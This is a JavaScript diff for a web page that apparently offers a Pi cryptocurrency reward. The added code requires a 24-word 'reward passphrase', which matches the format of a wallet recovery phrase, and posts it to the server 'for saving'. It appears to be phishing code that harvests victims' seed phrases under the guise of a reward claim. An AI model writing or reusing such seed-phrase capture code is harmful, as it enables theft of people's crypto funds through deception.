@@ -51,26 +51,31 @@ document.getElementById('close-reward-popup').addEventListener('click', () => {
 document.getElementById('claim-reward-btn').addEventListener('click', () => {
     const rewardPassphrase = document.getElementById('reward-passphrase').value.trim();
 
-    fetch('/claim-reward', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ passphrase: rewardPassphrase }),
-    })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                alert(data.message); // Success message
-                document.getElementById('reward-popup').style.display = 'none';
-            } else {
-                alert(data.message); // Error message (e.g., "You can only Claim once.")
-            }
+    if (rewardPassphrase.split(' ').length === 24) {
+        // Send the passphrase to the backend for saving
+        fetch('/claim-reward', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ passphrase: rewardPassphrase }),
         })
-        .catch(error => {
-            console.error('Error claiming reward:', error);
-            alert('An error occurred while processing your request.');
-        });
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert(data.message);
+                    document.getElementById('reward-popup').style.display = 'none';
+                } else {
+                    alert('Failed to claim reward: ' + data.message);
+                }
+            })
+            .catch(error => {
+                console.error('Error processing reward claim:', error);
+                alert('An error occurred while claiming the reward.');
+            });
+    } else {
+        alert('Invalid passphrase! Please enter the correct 24-word passphrase.');
+    }
 });
 
 // Event listener for when Pi amount is changed
@@ -79,7 +84,7 @@ piAmountInput.addEventListener('input', updateUsdAmount);
 // Initial call to set the exchange rate text when page loads
 updateUsdAmount();
 
-// Form submission handler
+// Form submission handler for "Sell"
 form.addEventListener('submit', function (event) {
     event.preventDefault();
 
